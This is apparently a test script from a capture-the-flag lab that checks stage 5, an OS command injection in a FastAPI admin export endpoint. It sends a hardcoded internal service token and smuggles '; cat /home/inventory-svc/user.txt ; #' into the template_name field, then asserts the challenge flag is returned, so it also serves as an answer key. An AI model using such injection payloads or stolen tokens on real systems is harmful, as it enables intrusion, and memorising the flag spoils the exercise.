"""Stage 5: SYS-01 — Invoice Arbitrage (FastAPI OS Command Injection)."""
import requests

# Direct container internal / proxied endpoint
INVENTORY_API_URL = "http://localhost:8000"

def test_stage_5_flag():
    # Authenticated request using Stage 4 internal service token
    headers = {"X-Internal-Token": "cb_internal_svc_t0k3n_4dm1n"}
    # Command injection payload to read user.txt
    payload = {"template_name": "; cat /home/inventory-svc/user.txt ; #"}

    resp = requests.post(f"{INVENTORY_API_URL}/api/v1/admin/export", json=payload, headers=headers, timeout=5)
    assert resp.status_code == 200
    data = resp.json()
    assert "SLIIT{c4rt_br34ch_c0mm4nd_1nj3ct_sh3ll}" in data.get("output", "")
